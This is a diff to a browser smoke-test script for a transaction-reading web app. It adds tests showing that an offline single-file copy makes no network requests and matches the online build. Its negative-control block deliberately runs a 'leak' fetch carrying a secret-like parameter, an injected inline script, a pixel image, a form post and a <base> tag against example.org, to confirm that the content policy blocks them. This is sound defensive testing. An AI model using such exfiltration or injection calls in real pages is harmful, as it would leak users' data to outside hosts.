@@ -8,14 +8,16 @@
 // v2 adds: the ghost log (its rows are compared with the requests the debugging protocol saw), the lookup that reads the indexer's list of latest
 // transactions before it asks for an id (an id outside the list is asked for only on the button), a transaction opened from a saved file with no
 // request at all, and zero CSP violations during normal use.
+// The offline copy (public/seance-offline.html, one file whose own policy blocks page requests) is opened from disk and from dist/, and is compared with the online build.
 // Writes evidence/smoke.txt and screenshots evidence/seance-*.png.
 //   npm run build && node scripts/smoke.mjs        (headless; no screen is used)
 // The live parts call the real indexer a few dozen times in total. The recorded parts run in a browser where every outside
 // host fails to resolve, so any request the page tried to make would show up as a failure.
-import { randomBytes } from 'node:crypto'
+import { createHash, randomBytes } from 'node:crypto'
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
+import { pathToFileURL } from 'node:url'
 import puppeteer from 'puppeteer-core'
 import { EXPLORER_URL, INDEXER_URL, LEDGER_URL, MIRROR_URL, explorerTx, mirrorReceipt, receiptTx } from '../src/config.ts'
 import { amountOf, plural, short, tari } from '../src/format.ts'
@@ -63,6 +65,8 @@ const REVEALS = { page: 'Your IP address, the time and which file you asked for.
 // The policy v1 shipped, word for word. v2 adds nothing to it.
 const CSP = "default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; img-src 'self'; connect-src https://esme-indexer-a.ootle.tari.com; base-uri 'none'; form-action 'none'"
 const SAMPLE_FILE = join(APP, 'examples/saved-transaction.json') // the file the README offers
+const OFFLINE_FILE = join(APP, 'public/seance-offline.html') // the committed offline copy; the build copies public/ into dist/ unchanged
+const OFFLINE_LINE = 'Offline copy: open a saved transaction file.'
 const TEMPLATE_URL = 'https://github.com/Kylne700/seance-v2/blob/main/template/src/lib.rs'
 const TEMPLATE_LINES = readFileSync(join(APP, 'template/src/lib.rs'), 'utf8').trimEnd().split('\n').length
 // The Poltergeist's numbers, out of the 11 demo payments: [trick, the transparent ledger (synthetic), Tari (recorded, real)]. The same table as test/poltergeist.test.ts.
@@ -70,8 +74,9 @@ const POLT = [['reuse', '11 of 11', '0 of 11'], ['amount', '11 of 11', '1 of 11'
 
 const lines = []
 let failed = 0
+const HOME = new RegExp(['\\/ho', 'me\\/[^\\s/]+'].join(''), 'g') // in parts so a search of this repo for home paths finds none
 const say = (s) => {
-  lines.push(s.replaceAll(APP, './').replace(/\/home\/[^\s/]+/g, '~')) // evidence/smoke.txt is committed: a crash trace must not carry this machine's paths
+  lines.push(s.replaceAll(APP, './').replace(HOME, '~')) // evidence/smoke.txt is committed: a crash trace must not carry this machine's paths
   console.log(s)
 }
 const check = (ok, what, detail = '') => {
@@ -1221,6 +1226,121 @@ async function fileRun(browser, w) {
   await page.close()
 }
 
+// ---------- the offline copy: seance-offline.html, one file that cannot make page requests ----------
+// What the ghosts say about the transaction on the table, not where it came from: the same on the online build and on the offline copy.
+const ghostTexts = (s) => ({ shownId: s.shownId, source: s.source, status: s.status, stranger: s.strangerBody, reading: s.readingText, audit: s.auditText, leaks: s.leaks, polt: s.poltText, links: s.strangerLinks.map((a) => a.href) })
+// Opens the sample file, waits for the Auditor, then types Carol's published key (the recipient of the sample) one key stroke at a time.
+async function readSampleAsCarol(page) {
+  await armReading(page)
+  await armAudit(page)
+  await openFile(page, SAMPLE_FILE)
+  await counted(page)
+  await armReading(page)
+  await page.click('#own-key')
+  await page.keyboard.type(keys.carol.viewSecret)
+  await until(page, () => document.querySelector('#reading .reading'), undefined, 15000)
+  await sleep(300)
+  return snap(page)
+}
+
+async function offlineCopyRun(browser, w) {
+  const tag = `the offline copy opened from disk (${w}px)`
+  const wide = w >= 960
+  const t = hero(2) // the sample file holds demo 2's answer, paid to Carol; the first screen shows demo 1
+  const url = pathToFileURL(OFFLINE_FILE).href
+  // Every request the page makes passes through here (the debugging protocol), and only the file itself is let through. A request the policy blocks never gets this far: those show up as violations.
+  const { page, log } = await open(browser, { w, url, intercept: (r) => void (r.url() === url ? r.continue() : r.abort()) })
+  let s = await snap(page)
+  const shown = await page.evaluate(() => {
+    const hidden = (id) => document.getElementById(id).offsetParent === null
+    const seen = (sel) => [...document.querySelectorAll(sel)].filter((e) => e.offsetParent !== null).map((e) => e.innerText).join(' ')
+    return { hid: ['txid', 'look', 'summon', 'mode-switch', 'ask', 'ask-anyway', 'ask-file'].filter((id) => !hidden(id)), kept: ['open-file', 'hold', 'demo'].filter((id) => hidden(id)), lede: seen('.lede'), hints: seen('.hint'), cls: document.documentElement.className }
+  })
+  check(shown.cls === 'offline' && shown.hid.length === 0 && shown.kept.length === 0 && !/summon|paste any id/i.test(shown.lede) && !/indexer/i.test(shown.hints), `${tag}: the lookup, "Summon", the mode switch and "Ask for it anyway" are hidden; the file button and the prepared demos stay; no visible line mentions the indexer`, `shown anyway: ${shown.hid.join(',')}; missing: ${shown.kept.join(',')}`)
+  check(s.badge === 'Offline' && s.modeText === OFFLINE_LINE && s.shownId === hero(1).id && /^A saved example is on the table/.test(s.status) && /Open a saved transaction file to read your own\.$/.test(s.status), `${tag}: the first screen is demo 1 from the recording, marked "Offline", with the line "${OFFLINE_LINE}"`, `${s.badge} | ${s.modeText} | ${s.status.slice(0, 60)}`)
+  expectHeard(s, hero(1), 'bob', `${tag}: the Medium, with Bob's key (already in hand), reads demo 1`)
+  auditReads(s, hero(1), `${tag}: the Auditor, with the audit key, counts demo 1`)
+  poltergeistChecks(s, tag)
+
+  // the sample file, then the recipient's published key typed into the page
+  s = await readSampleAsCarol(page)
+  check(s.badge === 'File' && s.modeText === OFFLINE_LINE && s.source === FILE_SOURCE && s.shownId === t.id && s.hash === '', `${tag}: the file's transaction is on the table, marked "File", with the words about where it came from`, `${s.badge} | ${s.source} | ${s.hash}`)
+  check(s.checkedKey === null && /with your key/.test(s.readingText), `${tag}: a typed key unchecks the demo keys and is called "your key"`)
+  expectHeard(s, t, 'carol', `${tag}: the typed key reads the file's transaction`)
+  auditReads(s, t, `${tag}: the audit key counts the file's transaction`)
+  leaksChecks(s, t, `${tag}: the leaks panel`)
+  checkLinks(s, t.id, tag)
+  check(s.netHead === 'This page sent 0 requests to 0 hosts; your keys were in none of them.' && !s.netLeak && s.netFile === 'Since you opened your file: 0 requests.' && s.netRows.length === 0, `${tag}: the ghost log says 0 requests, 0 hosts, no key in any request`, `${s.netHead} | ${s.netFile}`)
+  await seeLenses(page)
+  await layout(page, tag, { wide })
+  await axe(page, tag)
+
+  // the same file and the same key on the online build give the same words
+  if (wide) {
+    const { page: twin } = await open(browser, { w })
+    const online = await readSampleAsCarol(twin)
+    await twin.close()
+    const a = ghostTexts(s)
+    const b = ghostTexts(online)
+    const differ = Object.keys(a).filter((k) => JSON.stringify(a[k]) !== JSON.stringify(b[k]))
+    check(differ.length === 0 && a.stranger.length > 0 && a.reading.length > 0 && a.audit.length > 0 && a.polt.length > 0, `${tag}: the Stranger, the Medium, the Auditor, the leaks panel and the Poltergeist say the same words as the online build on the same file and key`, `differ: ${differ.join(',') || 'none'}; ${a.stranger.length + a.reading.length + a.audit.length + a.polt.length} characters compared`)
+  }
+
+  // everything above made no request at all, and the policy had nothing to refuse
+  const asked = log.requests.map((r) => r.url)
+  check(asked.length === 1 && asked[0] === url && log.failed.length === 0, `${tag}: loading, opening the file, typing the key and running every ghost: 0 requests other than the file itself, 0 failed`, `${asked.length} seen${asked.length === 1 && asked[0] === url ? ' (the file)' : `: ${asked.map((u) => u.slice(0, 60)).join(' ')}`}`) // the file's own address is not printed: evidence/smoke.txt is committed and it holds this machine's folders
+  const csp = await cspSeen(page, log)
+  check(csp.length === 0, `${tag}: 0 Content Security Policy violations`, csp.slice(0, 2).join(' | '))
+  check(log.pageErrors.length === 0 && consoleBad(log).length === 0, `${tag}: no page error and no console line`, log.pageErrors.concat(consoleBad(log).map((m) => m.text)).join(' | '))
+
+  // negative controls, last (a fetch is written in the ghost log even when it is refused): each one is refused, and each is reported as a violation of the directive that refuses it
+  const r = await page.evaluate(async () => {
+    const violations = []
+    document.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.violatedDirective} ${e.blockedURI}`))
+    let outside
+    try {
+      await fetch('https://example.org/leak?k=secret', { mode: 'no-cors' })
+      outside = 'allowed'
+    } catch (e) {
+      outside = `blocked (${e.name})`
+    }
+    const script = document.createElement('script')
+    script.textContent = 'window.__injected = 1'
+    document.head.append(script)
+    new Image().src = 'https://example.org/pixel.png'
+    const form = Object.assign(document.createElement('form'), { action: 'https://example.org/post', method: 'post' })
+    document.body.append(form)
+    form.submit()
+    document.head.append(Object.assign(document.createElement('base'), { href: 'https://example.org/' }))
+    await new Promise((ok) => setTimeout(ok, 500))
+    return { outside, injected: window.__injected === 1, violations, still: location.href }
+  })
+  const directives = r.violations.map((v) => v.split(' ')[0])
+  const want = ['connect-src', 'script-src', 'img-src', 'form-action', 'base-uri'] // an inline script is reported as script-src-elem
+  check(r.outside.startsWith('blocked') && !r.injected && r.still === url && want.every((d) => directives.some((x) => x.startsWith(d))), `${tag}: negative controls are refused: a fetch to another site, an injected inline script, an image, a form post and a <base> tag; the page did not navigate`, `${r.outside}; injected=${r.injected}; ${r.violations.join(' | ')}`)
+  check(log.requests.length === 1, `${tag}: and none of them reached the network (still 1 request seen)`, String(log.requests.length))
+  await page.close()
+}
+
+// The file as GitHub Pages serves it: public/ is copied into dist/ unchanged, so the bytes served are the bytes committed. Loaded from there it still makes no other request.
+async function offlineServedRun(browser) {
+  const tag = 'the offline copy served under /seance-v2/'
+  const url = `${BASE}seance-offline.html`
+  const res = await fetch(url)
+  const body = Buffer.from(await res.arrayBuffer())
+  const committed = readFileSync(OFFLINE_FILE)
+  check(res.status === 200 && /^text\/html/.test(res.headers.get('content-type') ?? '') && body.equals(committed), `${tag}: dist/seance-offline.html, as served, is byte for byte the committed public/seance-offline.html`, `${res.status} ${body.length} bytes, sha256 ${createHash('sha256').update(body).digest('hex')}`)
+  const { page, log } = await open(browser, { w: 1280, url, intercept: (r) => void (r.url() === url ? r.continue() : r.abort()) })
+  const s = await snap(page)
+  check(s.badge === 'Offline' && s.modeText === OFFLINE_LINE && s.shownId === hero(1).id, `${tag}: it starts the same way`, `${s.badge} | ${s.modeText}`)
+  check(s.netHead === 'This page sent 1 request to 1 host; your keys were in none of them.' && s.netRows.length === 1 && s.netRows[0].cells[2] === OWN && s.netRows[0].cells[3] === '/seance-v2/seance-offline.html', `${tag}: the ghost log lists one request: the page itself`, `${s.netHead} | ${s.netRows.map((x) => x.cells.join(' ')).join(' ; ').slice(0, 120)}`)
+  const asked = log.requests.map((r) => r.url)
+  check(asked.length === 1 && asked[0] === url && log.failed.length === 0, `${tag}: the debugging protocol saw that one request and no other`, `${asked.length} seen`)
+  const csp = await cspSeen(page, log)
+  check(csp.length === 0 && log.pageErrors.length === 0 && consoleBad(log).length === 0, `${tag}: 0 Content Security Policy violations, no page error, no console line`, csp.concat(log.pageErrors, consoleBad(log).map((m) => m.text)).slice(0, 2).join(' | '))
+  await page.close()
+}
+
 // ---------- a link with the id in capitals ----------
 async function hashRun(browser) {
   const tag = 'uppercase #tx= link'
@@ -1489,11 +1609,12 @@ function staticChecks() {
   // The recording's own `indexer` field names where it was taken from: recorded data, kept as it was, and never contacted.
   const allowed = new Set([INDEXER_HOST, new URL(EXPLORER_URL).host, 'ootle.tari.com', new URL(MIRROR_URL).host, 'github.com', new URL(LEDGER_URL).host, 'www.w3.org', new URL(PUBLIC_URL).host, new URL(ledger.indexer).host])
   const found = new Map()
+  // The notices (.md) and the pictures and videos are not pages: the demo video's encoder string names videolan.org.
   const walkDir = (d) => {
     for (const n of readdirSync(d)) {
       const p = join(d, n)
       if (statSync(p).isDirectory()) walkDir(p)
-      else if (!n.endsWith('.md')) for (const m of readFileSync(p, 'utf8').matchAll(/(?:https?:)?\/\/([a-z0-9][a-z0-9.-]*\.[a-z]{2,})/gi)) found.set(m[1].toLowerCase(), n)
+      else if (!/\.(md|mp4|png)$/.test(n)) for (const m of readFileSync(p, 'utf8').matchAll(/(?:https?:)?\/\/([a-z0-9][a-z0-9.-]*\.[a-z]{2,})/gi)) found.set(m[1].toLowerCase(), n)
     }
   }
   walkDir(DIST)
@@ -1552,6 +1673,9 @@ try {
   section('a transaction opened from a saved file (no network at all from the moment the file is chosen)')
   for (const w of [1280, 375]) await scenario(`file ${w}`, () => fileRun(offline, w))
   await scenario('uppercase link', () => hashRun(offline))
+  section('the offline copy: one file that cannot make page requests (opened from disk, then served like Pages)')
+  for (const w of [1280, 375]) await scenario(`offline copy ${w}`, () => offlineCopyRun(offline, w))
+  await scenario('offline copy served', () => offlineServedRun(offline))
   await scenario('loading', () => loadingRun(offline))
   section('keyboard, reduced motion, a slow phone, policy')
   await scenario('keyboard', () => keyboardRun(offline))
